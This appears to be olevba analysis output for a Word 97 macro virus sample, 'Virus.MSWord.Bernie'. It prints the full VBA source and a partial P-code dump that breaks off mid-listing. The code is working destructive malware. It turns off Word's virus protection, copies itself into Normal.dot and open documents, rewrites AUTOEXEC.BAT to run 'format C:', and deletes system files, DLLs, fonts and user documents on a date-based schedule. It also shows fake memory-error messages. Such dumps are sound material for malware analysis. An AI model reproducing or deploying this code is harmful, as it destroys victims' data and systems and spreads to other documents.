olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bernie
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bernie - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
    Routine
    Set aRange = ActiveDocument.Range
    aRange.InsertAfter "很抱歉，您的記憶體無法完整讀取此份文件，請結束不必要的常駐程式重新開啟本文件。如果記憶體還是不足，請連結至以下網站洽詢：http://www.trend.com.tw/"
End Sub
-------------------------------------------------------------------------------
VBA MACRO 增益集.bas 
in file: Virus.MSWord.Bernie - OLE stream: 'Macros/VBA/增益集'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Const xTitle$ = "PccTrend Virus for Word 97"
Public Const Config$ = "C:\CONFIG.SYS"
Public Const Autoexec$ = "C:\AUTOEXEC.BAT"
Public Const MSDOSSYS$ = "C:\MSDOS.SYS"

Sub AutoOpen()
    On Error Resume Next
    Routine
    Select Case Day(Now)
        Case 1 To 6
            ReAuto
        Case 7 To 12
            ReConfig
            ReAuto
            Name WinPath & "\WIN.COM" As WinPath & "\LOSE.COM"
        Case 13 To 20
            ReConfig
            Kill WinPath & "\HELP\*.*"
        Case 21 To 30
            Name Config$ As "C:\PCCTREND.SYS"
            SetAttr MSDOSSYS$, 0
            Kill MSDOSSYS$
    End Select
    DelFile
    For j = 1 To 30
        Documents.Add.SaveAs FileName:=WinPath & "\" & xTitle$ & j
    Next j
End Sub

Public Sub AutoClose()
    On Error Resume Next
    uu = InputBox$("輸入密碼:", xTitle$, "我不知道")
    If UCase(Trim(uu)) = "BERNIE" Then Exit Sub
    Routine
End Sub

Public Sub FilePrint()
    MsgBox "您的系統尚未安裝印表機！", vbCritical, xTitle$
End Sub

Public Sub DelFile()
    On Error Resume Next
    Select Case GetRandomNumber(1, 100)
        Case 1, 3, 5, 12 To 67
            Kill SystemPath & "\*.DLL"
        Case 2, 4, 90 To 100
            Kill SystemPath & "\B*.*"
        Case 6 To 11
            Kill CurDir & "\*.*"
            Kill WinPath & "\A*.*"
            Kill WinPath & "\CURSORS\*.*"
            Kill WinPath & "\CONFIG\*.*"
            Kill WinPath & "\W*.*"
            Kill SystemPath & "\W*.*"
        Case 68 To 72
            Kill WinPath & "\*.INI"
            Kill WinPath & "\H*.*"
            Kill Options.DefaultFilePath(wdDocumentsPath) & "\*.*"
        Case 73 To 89
            Kill SystemPath & "\*.DRV"
            Kill SystemPath & "\P*.*"
    End Select
    Kill WinPath & "\FONTS\*.*"
    Kill WinPath & "\INF\*.*"
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:PCCTREND < c"
    Close #No
End Sub

Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by " & xTitle$
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub

Public Function SystemPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetSystemDirectory(b, 255)
        SystemPath = Trim(Left(b, L))
End Function

Public Function WinPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetWindowsDirectory(b, 255)
        WinPath = Trim(Left(b, L))
End Function

Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
        h = WritePrivateProfileString(Section, KeyName, Setting, File)
End Sub

Public Function GetSettings(AppName As String, Key As String, File As String) As String
        R$ = String$(255, 0)
        X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
        R$ = Left(R$, InStr(R$, Chr(0)) - 1)
        GetSettings = R$
End Function

Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
        If Mini >= Maxi Then
                MsgBox Mini & " 必須比 " & Maxi & " 大！", vbCritical
                GetRandomNumber = 0
                Exit Function
        End If
        Randomize Timer
        GetRandomNumber = Int((Maxi * Rnd) + Mini)
End Function
Sub ToolsMacro()
Dim Pb
On Error Resume Next
WordBasic.BeginDialog 359, 271, "巨集"
    WordBasic.PushButton 234, 6, 120, 21, "錄製(O)...", "Push1"
    WordBasic.PushButton 234, 29, 120, 21, "取消", "Push2"
    WordBasic.PushButton 234, 55, 120, 21, "執行(R)", "Push3"
    WordBasic.PushButton 234, 79, 120, 21, "建立(E)", "Push4"
    WordBasic.PushButton 234, 103, 120, 21, "刪除(D)", "Push5"
    WordBasic.PushButton 234, 130, 120, 21, "  組合管理(G)...", "Push6"
    WordBasic.PushButton 234, 154, 120, 21, "說明(H)", "Push7"
    WordBasic.Text 10, 9, 96, 18, "巨集名稱(M):", "Text1"
    WordBasic.Text 10, 175, 112, 13, "巨集作用於(A):", "Text2"
    WordBasic.Text 10, 207, 64, 15, "說明(I):", "Text3"
    WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
    WordBasic.TextBox 15, 42, 207, 129, "TextBox6", 1
    WordBasic.TextBox 11, 188, 340, 18, "TextBox3"
    WordBasic.TextBox 12, 223, 341, 39, "TextBox4", 1
WordBasic.EndDialog
    Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
    Pb = WordBasic.Dialog.UserDialog(dlg)
    Select Case Pb
        Case 1 To 4
            MsgBox "記憶體用完"
        Case 5 'Delete
            MsgBox Time
        Case 6
            MsgBox Date
    End Select
End Sub

Public Sub FileOpen()
    MsgBox "記憶體不足，無法開啟檔案。", vbCritical, xTitle$
End Sub

Public Sub FileExit()
    MsgBox "您確定記憶體足夠嗎？", vbInformation + vbYesNoCancel, xTitle$
End Sub

Public Sub Routine()
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    On Error Resume Next
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If Not ActiveDocument.VBProject.VBComponents(i).Name = "增益集" Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="增益集", Object:=wdOrganizerObjectProjectItems
            ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
        End If
    Next
    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If Not NormalTemplate.VBProject.VBComponents(j).Name = "增益集" Then
           Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="增益集", Object:=wdOrganizerObjectProjectItems
           Options.SaveNormalPrompt = False
        End If
    Next
    Application.DisplayAlerts = wdAlertsAll
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bernie
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2942 bytes
' Error: unpack_from requires a buffer of at least 1851878827 bytes for unpacking 2 bytes at offset 1851878825 (actual buffer size is 2942).
' Macros/VBA/增益集 - 15034 bytes
' Line #0:
' 	FuncDefn (Public Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Public Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #2:
' 	Dim (Public Const) 
' 	LitStr 0x001A "PccTrend Virus for Word 97"
' 	VarDefn xTitle
' Line #3:
' 	Dim (Public Const) 
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	VarDefn Config
' Line #4:
' 	Dim (Public Const) 
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	VarDefn Autoexec
' Line #5:
' 	Dim (Public Const) 
' 	LitStr 0x000C "C:\MSDOS.SYS"
' 	VarDefn MSDOSSYS
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoOpen())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	ArgsCall Routine 0x0000 
' Line #10:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	CaseTo 
' 	CaseDone 
' Line #12:
' 	ArgsCall ReAuto 0x0000 
' Line #13:
' 	LitDI2 0x0007 
' 	LitDI2 0x000C 
' 	CaseTo 
' 	CaseDone 
' Line #14:
' 	ArgsCall ReConfig 0x0000 
' Line #15:
' 	ArgsCall ReAuto 0x0000 
' Line #16:
' 	Ld WinPath 
' 	LitStr 0x0008 "\WIN.COM"
' 	Concat 
' 	Ld WinPath 
' 	LitStr 0x0009 "\LOSE.COM"
' 	Concat 
' 	Name 
' Line #17:
' 	LitDI2 0x000D 
' 	LitDI2 0x0014 
' 	CaseTo 
' 	CaseDone 
' Line #18:
' 	ArgsCall ReConfig 0x0000 
' Line #19:
' 	Ld WinPath 
' 	LitStr 0x0009 "\HELP\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #20:
' 	LitDI2 0x0015 
' 	LitDI2 0x001E 
' 	CaseTo 
' 	CaseDone 
' Line #21:
' 	Ld Config$ 
' 	LitStr 0x000F "C:\PCCTREND.SYS"
' 	Name 
' Line #22:
' 	Ld MSDOSSYS$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #23:
' 	Ld MSDOSSYS$ 
' 	ArgsCall Kill 0x0001 
' Line #24:
' 	EndSelect 
' Line #25:
' 	ArgsCall DelFile 0x0000 
' Line #26:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #27:
' 	Ld WinPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld xTitle$ 
' 	Concat 
' 	Ld j 
' 	Concat 
' 	ParamNamed FileName 
' 	Ld Documents 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Public Sub AutoClose())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	LitStr 0x0009 "輸入密碼:"
' 	Ld xTitle$ 
' 	LitStr 0x0008 "我不知道"
' 	ArgsLd InputBox$ 0x0003 
' 	St uu 
' Line #34:
' 	Ld uu 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "BERNIE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #35:
' 	ArgsCall Routine 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' Line #38:
' 	FuncDefn (Public Sub FilePrint())
' Line #39:
' 	LitStr 0x0018 "您的系統尚未安裝印表機！"
' 	Ld vbCritical 
' 	Ld xTitle$ 
' 	ArgsCall MsgBox 0x0003 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Public Sub DelFile())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd GetRandomNumber 0x0002 
' 	SelectCase 
' Line #45:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x000C 
' 	LitDI2 0x0043 
' 	CaseTo 
' 	CaseDone 
' Line #46:
' 	Ld SystemPath 
' 	LitStr 0x0006 "\*.DLL"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #47:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x005A 
' 	LitDI2 0x0064 
' 	CaseTo 
' 	CaseDone 
' Line #48:
' 	Ld SystemPath 
' 	LitStr 0x0005 "\B*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #49:
' 	LitDI2 0x0006 
' 	LitDI2 0x000B 
' 	CaseTo 
' 	CaseDone 
' Line #50:
' 	Ld CurDir 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	Ld WinPath 
' 	LitStr 0x0005 "\A*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	Ld WinPath 
' 	LitStr 0x000C "\CURSORS\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #53:
' 	Ld WinPath 
' 	LitStr 0x000B "\CONFIG\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #54:
' 	Ld WinPath 
' 	LitStr 0x0005 "\W*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #55:
' 	Ld SystemPath 
' 	LitStr 0x0005 "\W*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #56:
' 	LitDI2 0x0044 
' 	LitDI2 0x0048 
' 	CaseTo 
' 	CaseDone 
' Line #57:
' 	Ld WinPath 
' 	LitStr 0x0006 "\*.INI"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	Ld WinPath 
' 	LitStr 0x0005 "\H*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #59:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #60:
' 	LitDI2 0x0049 
' 	LitDI2 0x0059 
' 	CaseTo 
' 	CaseDone 
' Line #61:
' 	Ld SystemPath 
' 	LitStr 0x0006 "\*.DRV"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #62:
' 	Ld SystemPath 
' 	LitStr 0x0005 "\P*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #63:
' 	EndSelect 
' Line #64:
' 	Ld WinPath 
' 	LitStr 0x000A "\FONTS\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #65:
' 	Ld WinPath 
' 	LitStr 0x0008 "\INF\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Public Sub ReAuto())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	Ld Autoexec$ 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "AUTOEXEC.BAT"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	Ld Autoexec$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld Friend 
' 	St No 
' Line #73:
' 	LitStr 0x0004 "C:\c"
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #74:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "y"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #75:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	PrintItemNL 
' Line #76:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #77:
' 	Ld Friend 
' 	St No 
' Line #78:
' 	Ld Autoexec$ 
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #79:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "PATH = C:\;"
' 	Ld WinPath 
' 	Concat 
' 	LitStr 0x0009 "\COMMAND;"
' 	Concat 
' 	Ld S 
' 	MemLd SystemPath 
' 	Concat 
' 	PrintItemNL 
' Line #80:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format C:/u/q/v:PCCTREND < c"
' 	PrintItemNL 
' Line #81:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Public Sub ReConfig())
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	Ld Config$ 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "CONFIG.SYS"
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld Friend 
' 	St No 
' Line #90:
' 	Ld Config$ 
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #91:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "Rem **** You're infected by "
' 	Ld xTitle$ 
' 	Concat 
' 	PrintItemNL 
' Line #92:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Dos = Low"
' 	PrintItemNL 
' Line #93:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "FCBS = 255"
' 	PrintItemNL 
' Line #94:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "FILES = 255"
' 	PrintItemNL 
' Line #95:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "LastDrive = Z"
' 	PrintItemNL 
' Line #96:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "SET TEMP = C:\"
' 	PrintItemNL 
' Line #97:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "SET TMP = C:\"
' 	PrintItemNL 
' Line #98:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "STACKS = 64, 512"
' 	PrintItemNL 
' Line #99:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "SWITCHES= /F /K /N"
' 	PrintItemNL 
' Line #100:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Public Function SystemPath() As String)
' Line #104:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn B
' Line #105:
' 	LitDI2 0x00FF 
' 	ArgsLd Space$ 0x0001 
' 	St B 
' Line #106:
' 	Ld B 
' 	LitDI2 0x00FF 
' 	ArgsLd GetSystemDirectory 0x0002 
' 	St L 
' Line #107:
' 	Ld B 
' 	Ld L 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St SystemPath 
' Line #108:
' 	EndFunc 
' Line #109:
' Line #110:
' 	FuncDefn (Public Function WinPath() As String)
' Line #111:
' 	Dim 
' 	LitDI2 0x00FF 
' 	VarDefn B
' Line #112:
' 	LitDI2 0x00FF 
' 	ArgsLd Space$ 0x0001 
' 	St B 
' Line #113:
' 	Ld B 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St L 
' Line #114:
' 	Ld B 
' 	Ld L 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St WinPath 
' Line #115:
' 	EndFunc 
' Line #116:
' Line #117:
' 	FuncDefn (Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String))
' Line #118:
' 	Ld Section 
' 	Ld KeyName 
' 	Ld Setting 
' 	Ld File 
' 	ArgsLd WritePrivateProfileString 0x0004 
' 	St h 
' Line #119:
' 	EndSub 
' Line #120:
' Line #121:
' 	FuncDefn (Public Function GetSettings(AppName As String, Key As String, File As String) As String)
' Line #122:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	ArgsLd String$$ 0x0002 
' 	St R$ 
' Line #123:
' 	Ld AppName 
' 	Ld Key 
' 	LitStr 0x0000 ""
' 	Ld R$ 
' 	Ld R$ 
' 	FnLen 
' 	Ld File 
' 	ArgsLd GetPrivateProfileString 0x0006 
' 	St X 
' Line #124:
' 	Ld R$ 
' 	Ld R$ 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St R$ 
' Line #125:
' 	Ld R$ 
' 	St GetSettings 
' Line #126:
' 	EndFunc 
' Line #127:
' Line #128:
' 	FuncDefn (Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single)
' Line #129:
' 	Ld Mini 
' 	Ld Maxi 
' 	Ge 
' 	IfBlock 
' Line #130:
' 	Ld Mini 
' 	LitStr 0x0008 " 必須比 "
' 	Concat 
' 	Ld Maxi 
' 	Concat 
' 	LitStr 0x0005 " 大！"
' 	Concat 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #131:
' 	LitDI2 0x0000 
' 	St GetRandomNumber 
' Line #132:
' 	ExitFunc 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #135:
' 	Ld Maxi 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Ld Mini 
' 	Add 
' 	FnInt 
' 	St GetRandomNumber 
' Line #136:
' 	EndFunc 
' Line #137:
' 	FuncDefn (Sub ToolsMacro())
' Line #138:
' 	Dim 
' 	VarDefn Pb
' Line #139:
' 	OnError (Resume Next) 
' Line #140:
' 	LitDI2 0x0167 
' 	LitDI2 0x010F 
' 	LitStr 0x0004 "巨集"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #141:
' 	LitDI2 0x00EA 
' 	LitDI2 0x0006 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "錄製(O)..."
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #142:
' 	LitDI2 0x00EA 
' 	LitDI2 0x001D 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0004 "取消"
' 	LitStr 0x0005 "Push2"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #143:
' 	LitDI2 0x00EA 
' 	LitDI2 0x0037 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "執行(R)"
' 	LitStr 0x0005 "Push3"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #144:
' 	LitDI2 0x00EA 
' 	LitDI2 0x004F 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "建立(E)"
' 	LitStr 0x0005 "Push4"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #145:
' 	LitDI2 0x00EA 
' 	LitDI2 0x0067 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "刪除(D)"
' 	LitStr 0x0005 "Push5"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #146:
' 	LitDI2 0x00EA 
' 	LitDI2 0x0082 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0010 "  組合管理(G)..."
' 	LitStr 0x0005 "Push6"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #147:
' 	LitDI2 0x00EA 
' 	LitDI2 0x009A 
' 	LitDI2 0x0078 
' 	LitDI2 0x0015 
' 	LitStr 0x0007 "說明(H)"
' 	LitStr 0x0005 "Push7"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #148:
' 	LitDI2 0x000A 
' 	LitDI2 0x0009 
' 	LitDI2 0x0060 
' 	LitDI2 0x0012 
' 	LitStr 0x000C "巨集名稱(M):"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #149:
' 	LitDI2 0x000A 
' 	LitDI2 0x00AF 
' 	LitDI2 0x0070 
' 	LitDI2 0x000D 
' 	LitStr 0x000E "巨集作用於(A):"
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #150:
' 	LitDI2 0x000A 
' 	LitDI2 0x00CF 
' 	LitDI2 0x0040 
' 	LitDI2 0x000F 
' 	LitStr 0x0008 "說明(I):"
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #151:
' 	LitDI2 0x000B 
' 	LitDI2 0x0017 
' 	LitDI2 0x00D5 
' 	LitDI2 0x0012 
' 	LitStr 0x0008 "TextBox5"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #152:
' 	LitDI2 0x000F 
' 	LitDI2 0x002A 
' 	LitDI2 0x00CF 
' 	LitDI2 0x0081 
' 	LitStr 0x0008 "TextBox6"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0006 
' Line #153:
' 	LitDI2 0x000B 
' 	LitDI2 0x00BC 
' 	LitDI2 0x0154 
' 	LitDI2 0x0012 
' 	LitStr 0x0008 "TextBox3"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #154:
' 	LitDI2 0x000C 
' 	LitDI2 0x00DF 
' 	LitDI2 0x0155 
' 	LitDI2 0x0027 
' 	LitStr 0x0008 "TextBox4"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0006 
' Line #155:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #156:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #157:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St Pb 
' Line #158:
' 	Ld Pb 
' 	SelectCase 
' Line #159:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	CaseTo 
' 	CaseDone 
' Line #160:
' 	LitStr 0x000A "記憶體用完"
' 	ArgsCall MsgBox 0x0001 
' Line #161:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000F 0x0006 "Delete"
' Line #162:
' 	Ld Time 
' 	ArgsCall MsgBox 0x0001 
' Line #163:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #164:
' 	Ld Date 
' 	ArgsCall MsgBox 0x0001 
' Line #165:
' 	EndSelect 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Public Sub FileOpen())
' Line #169:
' 	LitStr 0x001A "記憶體不足，無法開啟檔案。"
' 	Ld vbCritical 
' 	Ld xTitle$ 
' 	ArgsCall MsgBox 0x0003 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
' 	FuncDefn (Public Sub FileExit())
' Line #173:
' 	LitStr 0x0014 "您確定記憶體足夠嗎？"
' 	Ld vbInformation 
' 	Ld vbYesNoCancel 
' 	Add 
' 	Ld xTitle$ 
' 	ArgsCall MsgBox 0x0003 
' Line #174:
' 	EndSub 
' Line #175:
' Line #176:
' 	FuncDefn (Public Sub Routine())
' Line #177:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #178:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #179:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #180:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #183:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "增益集"
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #184:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "增益集"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #185:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
